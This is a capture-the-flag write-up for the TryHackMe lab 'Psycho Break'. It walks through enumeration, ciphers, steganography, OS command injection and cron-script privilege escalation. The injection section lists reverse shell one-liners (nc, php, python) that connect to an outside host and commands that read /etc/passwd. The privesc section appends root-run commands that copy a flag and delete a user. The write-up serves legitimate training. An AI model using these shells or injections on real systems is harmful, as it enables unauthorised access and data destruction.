# Psycho Break

To be honest, [this room](https://tryhackme.com/room/psychobreak) is really great and explores various aspects of CTF's. It includes not just in-depth enumeration but things from basic source-code analysis to steganography and a lot many things. It took me quite some to solve this room (you'll know the reason once you read the writeup). But in short, this room would help any beginner to learn a lot of different things.

So, let's begin!

### [Task 1] Recon

1. ##### Deploy the machine.

Obviously, the first and most important step to complete any room is to deploy the machine first of all.

2. ##### How many ports are open?

To get the answer for this question the best solution is to run an `nmap` scan against the IP address of the machine.

```
┌─[tester@parrot-virtual]─[~/Downloads/psychoBreak]
└──╼ $nmap -A 10.10.167.133
Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-12 00:28 IST
Nmap scan report for 10.10.167.133
Host is up (0.15s latency).
Not shown: 997 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     ProFTPD 1.3.5a
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 44:2f:fb:3b:f3:95:c3:c6:df:31:d6:e0:9e:99:92:42 (RSA)
|   256 92:24:36:91:7a:db:62:d2:b9:bb:43:eb:58:9b:50:14 (ECDSA)
|_  256 34:04:df:13:54:21:8d:37:7f:f8:0a:65:93:47:75:d0 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Welcome To Becon Mental Hospital
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 35.16 seconds
```

And we can see, all the ports that are open on the machine!

3. ##### What is the operating system that runs on the target machine?

The answer to this question can be guessed from the details that we obtained from the nmap scan. We can see that an OS type of Unix, Linux was detected and the other hint that we can find is from the SSH and Apache version.

### [Task 2]  Web

1. ##### Key to the locker room.

From the nmap scan we can see that port 80 is open and Apache server is running on it. So, we can visit the IP address and check what is being hosted over there. 

![homepage](./.images/homepage.png)

This just gives us a very brief overview of the page but no useful information. So, can go ahead and check the source-code of the page to see if some information is available over there.

![homepage_source](./.images/homepage_source.png)

And here we find a path for a hidden directory. We can visit the path and look for any further hints.

![locker_key](./.images/locker_key.png)

On the hidden page, we can see a clickable link. On clicking the link, we get a pop-up which gives us the key to the locker room. Now that we have the key, we can submit it as the answer as well.

2. ##### Key to access the map

As soon as we get the locker room key and press "OK", we get redirected to another page where we can find a link for the locker room.

![link_to_locker](./.images/link_to_locker.png)

And when we click that link, it asks for the locker room key in a pop-up window.Once submitted the obtained key, we get redirected to the locker room.

![locker_room](./.images/locker_room.png)

On the locker room page, we are challenged with a cipher text that we need to decipher inorder to use it as the key to access the map. This appears to be encoded using some sort of rotation algorithm. So, we can head over to [CyberChef](https://gchq.github.io/CyberChef/) and try different variations of `ROT13` and `ROT47` encoding methods. Even after trying every possible variation of these two methods, we can't decipher the string. Another method that can come to our mind is `Vigenere Cipher`. Just FYI, Vigenre Cipher contains only alphabets and neither any of the numbers nor any of the special characters. And the string that we have here is something similar to that only. One thing to keep in mind is that `Vigenere Cipher` requires an alphabetic key to decipher the text which in this case we haven't found yet. So, after some googling, we can find [this website](https://www.guballa.de/vigenere-solver) which can decipher `Vignere Cipher` without any key. So, we can paste in our cipher text and select different Cipher Variants with language set to "English" and try to break the cipher. After a few attempts, we get the key that is required to access the map.

![map_key](./.images/map_key.png)

So, here we get the key to access the map. Submitting this key as the answer, we can now move ahead and access the map from the link present on the locker room page itself.

3. ##### The Keeper Key

As soon as we click on the link to access the map, we are asked to enter the key to access the map. Once entered the key, we get an index of all the various rooms present.

![map](./.images/map.png)

Out of these four rooms, we have already completed two. So, our next step would be to access the third room which is "Safe Heaven".

This room appears to be pretty simple and contains a few images as well but nothing that can be useful to us.

![safe_room](./.images/safe_room.png)

We can go ahead and check for any information in it's source-code.

![safe_room_hint](./.images/safe_room_hint.png)

Here, we are provided with a hint to search through this page. We know that multiple images are hosted on this page and all of this are of type `.jpg` which are usually used for "Steganography". So, we can download each and every image on this page and try to run various steganography tools such as `stegohide`, `stegoveritas` and `exiftools` but we won't find anything (P.S. Trust me I've wasted a few hours trying to check every possible case of hidden data in each of these images). The next thing that can come to our mind is try to run a directory traversal attack on this directory.

```
┌─[✗]─[tester@parrot-virtual]─[~/Downloads/psychoBreak]
└──╼ $ffuf -u http://10.10.167.133/SafeHeaven/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -recursion

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.0.2
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.167.133/SafeHeaven/FUZZ
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403
________________________________________________

# Priority ordered case sensative list, where entries were found  [Status: 200, Size: 1299, Words: 88, Lines: 52]
#                       [Status: 200, Size: 1299, Words: 88, Lines: 52]
# Copyright 2007 James Fisher [Status: 200, Size: 1299, Words: 88, Lines: 52]
# directory-list-2.3-medium.txt [Status: 200, Size: 1299, Words: 88, Lines: 52]
# or send a letter to Creative Commons, 171 Second Street,  [Status: 200, Size: 1299, Words: 88, Lines: 52]
# license, visit http://creativecommons.org/licenses/by-sa/3.0/  [Status: 200, Size: 1299, Words: 88, Lines: 52]
# Attribution-Share Alike 3.0 License. To view a copy of this  [Status: 200, Size: 1299, Words: 88, Lines: 52]
# This work is licensed under the Creative Commons  [Status: 200, Size: 1299, Words: 88, Lines: 52]
                        [Status: 200, Size: 1299, Words: 88, Lines: 52]
#                       [Status: 200, Size: 1299, Words: 88, Lines: 52]
# Suite 300, San Francisco, California, 94105, USA. [Status: 200, Size: 1299, Words: 88, Lines: 52]
#                       [Status: 200, Size: 1299, Words: 88, Lines: 52]
#                       [Status: 200, Size: 1299, Words: 88, Lines: 52]
# on atleast 2 different hosts [Status: 200, Size: 1299, Words: 88, Lines: 52]
imgs                    [Status: 301, Size: 324, Words: 20, Lines: 10]
[INFO] Adding a new job to the queue: http://10.10.167.133/SafeHeaven/imgs/FUZZ
                        [Status: 200, Size: 1299, Words: 88, Lines: 52]
keeper                  [Status: 301, Size: 326, Words: 20, Lines: 10]
[INFO] Adding a new job to the queue: http://10.10.167.133/SafeHeaven/keeper/FUZZ
```

 Here, we can see a hidden directory has been detected `keeper`. 

On visiting that page, we get a link to `Escape Keeper`. When we click on that link, we are show an image and asked to find it's real location name. Also, there is timer running so we need to be quick to reverse search the image.

*P.S. No worries if your timer expires, you can just refresh the page and the timer resets.*

We can quickly save the image by right clicking and selecting save the image option. Then we need to go to google image search and search by uploading the image.

![escape_keeper_google](./.images/escape_keeper_google.png)

And here we find the location of the image that can be entered in the challenge to obtain the Keeper Key.  As soon as we submit the location name, we are redirected to another page where we are provided the keeper key. We can submit this key as the answer and move ahead to the fourth and last room on the map.

4. ##### What is the filename of the text file (without the file extension)

On the abandoned room page, we can find a link saying "Go Further" which leads us to another page where a timer is running and asks us to "Run" from the "Laura the Spiderlady". (I found this task really difficult and almost took an entire day to solve it)

There is no hint on the page as to how to run from laura, so we can head over to the source-code to see if some hint is provided over there.

![run_laura](./.images/run_laura.png)

Here, we are provided with a hint that there is "something called as `shell`" on the page that might be helpful. This gives an immediate hint towards OS command injection via setting GET request parameters in the URL. 

So, we can add the parameter `shell` to the URL and pass any OS commands to it. From the inital recon we know that it is a Linux machine. So, can try its compatible commands.

```
http://10.10.167.133/abandonedRoom/*********************************/herecomeslara.php?shell=ls
```

Sending this command would show us the files present in the current directory.

![laura_shell](./.images/laura_shell.png)

But here comes the tricky part, other than `ls` none of the commands worked. We can try various commands like:

```
cat /etc/passwd
ls -la
ls ../
ls ../../
pwd
id

Reverse Shell codes:
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 4242 >/tmp/f
php -r '$sock=fsockopen("10.0.0.1",4242);$proc=proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'
export RHOST="10.0.0.1";export RPORT=4242;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
```

But none of these work. After almost a day, I got a hint from someone to try to use `ls ..`, to which I was surprised as I had already tried `ls ../` which did not work.

![laura_hidden_path](./.images/laura_hidden_path.png)

So, here we find another hidden directory. We can copy the path and add it to the URL and access it:

```
http://10.10.167.133/abandonedRoom/*********************************/
```

On visiting the directory, we find a zip and a text file over there.

![hidden_dir](./.images/hidden_dir.png)

We can download both these file and check their content.

Also, the name of this text file can be submitted as the answer.

### [Task 3] Help Mee

1. ##### Who is locked up in the cell?

The text file named `you_made_it.txt` does not contain anything useful so we can unzip the `helpme.zip` file and check it's content.

```
┌─[tester@parrot-virtual]─[~/Downloads/psychoBreak]
└──╼ $unzip helpme.zip 
Archive:  helpme.zip
  inflating: helpme.txt              
  inflating: Table.jpg               
┌─[tester@parrot-virtual]─[~/Downloads/psychoBreak]
└──╼ $cat helpme.txt 

From XXXXXX,

Who ever sees this message "HELP Me". Ruvik locked me up in this cell. Get the key on the table and unlock this cell. I'll tell you what happened when I am out of 
this cell.
```

We obtain two files from the zip out of which one is a text file and the other one is a jpg image. There is note in the text file where someone is asking for help and giving a hint that the key is stored in the image `Table.jpg`. Also, the name of this person, who has written this note can be submitted as the answer.

2. ##### There is something weird with the .wav file. What does it say?

On trying to view the image, we can come to know that it is in reality not an image file but something else. So, we can check its file type by using the command `file`

```
┌─[✗]─[tester@parrot-virtual]─[~/Downloads/psychoBreak]
└──╼ $file Table.jpg 
Table.jpg: Zip archive data, at least v2.0 to extract
```

After unzipping the file, we obtain two another files:

```
┌─[tester@parrot-virtual]─[~/Downloads/psychoBreak]
└──╼ $mv Table.jpg Table.zip
┌─[tester@parrot-virtual]─[~/Downloads/psychoBreak]
└──╼ $unzip Table.zip 
Archive:  Table.zip
  inflating: Joseph_Oda.jpg          
  inflating: key.wav  
```

The question asks about the `wav` file, so we can first check its content by playing it. We can hear some beep kind of sound which suggests that it is a morse code. So, we can google a bit and find a morse code audio decoder. I found one over [here](https://morsecode.world/international/decoder/audio-decoder-adaptive.html). Once, we submit the file and it gets processed we get a string which appears to be the key for the data hidden in the `Joseph_Oda.jpg` file. Also, the string obtained from the `wav` file can be submitted as the answer. 

3. ##### What is the FTP Username

4. ##### What is the FTP Password

So, the next thing that we must do is use `steghide` over the `jpg` file and pass the key obtained from `wav` file as the passphrase to get the hidden content.

```
┌─[tester@parrot-virtual]─[~/Downloads/psychoBreak]
└──╼ $steghide extract -sf Joseph_Oda.jpg 
Enter passphrase: 
wrote extracted data to "thankyou.txt".
┌─[tester@parrot-virtual]─[~/Downloads/psychoBreak]
└──╼ $cat thankyou.txt 

From joseph,

Thank you so much for freeing me out of this cell. Ruvik is nor good, he told me that his going to kill sebastian and next would be me. You got to help 
Sebastian ... I think you might find Sebastian at the Victoriano Estate. This note I managed to grab from Ruvik might help you get inn to the Victoriano Estate. 
But for some reason there is my name listed on the note which I don't have a clue.

	   --------------------------------------------
        //						\\
	||	(NOTE) FTP Details			||
	||      ==================			||
	||						||
	||	USER : joseph				||
	||	PASSWORD : *****************		||
	||						||
	\\						//
	   --------------------------------------------
	

Good luck, Be carefull !!!

```

From the extracted hidden data, we get the login credentials of user `joseph` for FTP. We can use these credentials and access the data store in FTP.

### [Task 4] Crack it open

1. ##### The key used by the program

```
┌─[tester@parrot-virtual]─[~/Downloads/psychoBreak]
└──╼ $ftp 10.10.167.133
Connected to 10.10.167.133.
220 ProFTPD 1.3.5a Server (Debian) [::ffff:10.10.167.133]
Name (10.10.167.133:tester): joseph
331 Password required for joseph
Password:
230 User joseph logged in
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -la
200 PORT command successful
150 Opening ASCII mode data connection for file list
drwxr-xr-x   2 0        0            4096 Aug 13 15:20 .
drwxr-xr-x   2 0        0            4096 Aug 13 15:20 ..
-rwxr-xr-x   1 joseph   joseph   11641688 Aug 13 15:12 program
-rw-r--r--   1 joseph   joseph        974 Aug 13 15:20 random.dic
226 Transfer complete
ftp> mget program
mget program? yes
200 PORT command successful
150 Opening BINARY mode data connection for program (11641688 bytes)
mget random.dic
226 Transfer complete
11641688 bytes received in 13.20 secs (860.9553 kB/s)
ftp> mget random.dic
mget random.dic? yes
200 PORT command successful
150 Opening BINARY mode data connection for random.dic (974 bytes)
226 Transfer complete
974 bytes received in 0.00 secs (9.7777 MB/s)
ftp> exit
221 Goodbye.
```

On the FTP, we find two files `program` which is an executable and a dictionary `random.dic`.

It appears that we must pass one by one each key from the dictionary to the program in order to obtain the correct key. To do so, we can write a small [python script](./script.py) to automate this task.

```
import os
import subprocess
import sys

f = open("random.dic", "r")

keys = f.readlines()

for key in keys:
	key = str(key.replace("\n", ""))
	print (key)
	subprocess.run(["./program", key])
```

Once we run the script after placing it in the same directory as `random.dic` and `program`, we can get the correct key from its output.

This key can be submitted as the answer.

2. ##### What do the crazy long numbers mean when there decrypted.

![script_op](./.images/script_op.png)

Now, here are we are present another encoded value. It is a bit difficult to guess this encoding as it contains only number. We can copy it and search on google to see if we can find something similar. 

On google, we can find that it is a T9 encoding which is basically a method that we used earlier on T9 keypad style mobiles to type a message. Where we used to enter number "1" three times to type character "C" or number "7" four times to type character "S".

To decode this string, we just need to do the same by finding the correspoding character on the basis of number of times the particular number is present for eg. 333 would correspond to "F" or 44 would correspond to "H".

Once decoded, we will get the answer to the next question.

### [Task 5] Go Capture The Flag

From the decryted string in last task, we can assume that the key from `program` is the user name and the decoded string is the password. So, we can go ahead and connect to the machine via SSH.

Hint: The password is in all CAPS.

1. ##### user.txt

As soon as we log in we can find the `user.txt` file which we can read and get the user flag.

```
kidman@evilwithin:~$ ls -la
total 44
drwxr-xr-x 4 kidman kidman 4096 Aug 13 21:51 .
drwxr-xr-x 5 root   root   4096 Jul 13 02:06 ..
-rw------- 1 kidman kidman    1 Aug 13 21:55 .bash_history
-rw-r--r-- 1 kidman kidman  220 Jul 13 00:48 .bash_logout
-rw-r--r-- 1 kidman kidman 3771 Aug 13 21:51 .bashrc
drwx------ 2 kidman kidman 4096 Jul 13 01:19 .cache
drwxrwxr-x 2 kidman kidman 4096 Jul 13 00:58 .nano
-rw-r--r-- 1 kidman kidman  655 Jul 13 00:48 .profile
-rw-rw-r-- 1 kidman kidman  264 Aug 13 21:28 .readThis.txt
-rw-r--r-- 1 root   root     26 Oct 12 04:40 .the_eye.txt
-rw-rw-r-- 1 kidman kidman   33 Jul 13 00:53 user.txt
kidman@evilwithin:~$ cat user.txt
```

This can be submitted as the user flag.

2. ##### root.txt

The first thing that we can check for PrivEsc is `sudo -l`:

```
kidman@evilwithin:~$ sudo -l
[sudo] password for kidman: 
Sorry, user kidman may not run sudo on evilwithin.
```

But apparently we are not allowed to run any commands as sudo. 

The next thing that we can check are the cron jobs.

```
kidman@evilwithin:~$ cat /etc/crontab 
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user	command
17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )

*/2 * * * * root python3 /var/.the_eye_of_ruvik.py
```

And here we can see a python script is running which is stored at `/var/.the_eye_of_ruvik.py`. We can check if we can edit this file and if so we can modify it and use for our benefit.

```
kidman@evilwithin:~$ ls -la /var/.the_eye_of_ruvik.py 
-rwxr-xrw- 1 root root 300 Aug 14 22:43 /var/.the_eye_of_ruvik.py
```

It appears that we can edit this file. So, we can add a command in it to write the content of `/root/root.txt` to a file in `/tmp` directory. But before that we need to create an empty file in `temp` and change its permissions so that when the script get executed it can write to the file.

```
kidman@evilwithin:~$ touch /tmp/flag
kidman@evilwithin:~$ chmod 777 /tmp/flag 
kidman@evilwithin:~$ ls -la /tmp/flag 
-rwxrwxrwx 1 kidman kidman 0 Oct 12 04:48 /tmp/flag
```

Now, we can modify the python script just by adding a simple line at the end of it:

```
kidman@evilwithin:~$ echo 'subprocess.call("cat /root/root.txt > /tmp/flag", shell=True)' >> /var/.the_eye_of_ruvik.py 
kidman@evilwithin:~$ cat /var/.the_eye_of_ruvik.py 
#!/usr/bin/python3

import subprocess
import random

stuff = ["I am watching you.","No one can hide from me.","Ruvik ...","No one shall hide from me","No one can escape from me"]
sentence = "".join(random.sample(stuff,1))
subprocess.call("echo %s > /home/kidman/.the_eye.txt"%(sentence),shell=True)

subprocess.call("cat /root/root.txt > /tmp/flag")
```

Now, we need to wait some time and check the file `/tmp/flag` where the script will automatically write down the flag from `/root/root.txt`.

3. ##### [Bonus] Defeat Ruvik

For this task we need to delete Ruvik's account, but that can be done only by `root`. So, we can add another command in the same python script to remove the user `ruvik` along with all his files:

```
kidman@evilwithin:/home$ echo 'subprocess.call("deluser --remove-all-files ruvik", shell=True)' >> /var/.the_eye_of_ruvik.py 
kidman@evilwithin:/home$ cat /var/.the_eye_of_ruvik.py 
#!/usr/bin/python3

import subprocess
import random

stuff = ["I am watching you.","No one can hide from me.","Ruvik ...","No one shall hide from me","No one can escape from me"]
sentence = "".join(random.sample(stuff,1))
subprocess.call("echo %s > /home/kidman/.the_eye.txt"%(sentence),shell=True)

subprocess.call("cat /root/root.txt > /tmp/flag", shell=True)
subprocess.call("deluser --remove-all-files ruvik", shell=True)
```

Now, just wait for some time and check the `/home` directory from where ruvik's directory would get deleted indicating that the user has been deleted.

With this we have completed the room!



## Some Key Points to Take Away

1. If none of the rotations decrypt your key always try for Vigenere Cipher.
2. Whenever you need information about an image, just reverse search it on Google or Yandex.
3. Try every possible command when attempting OS command injection.
4. Whenever you get an audio file containing beeps, try to decode it as Morse Code.



#### Links Referred

1. TryHackMe-Psycho Break: https://tryhackme.com/room/psychobreak
2. CyberChef: https://gchq.github.io/CyberChef/
3. Morse Code Audio Decoder: https://morsecode.world/international/decoder/audio-decoder-adaptive.html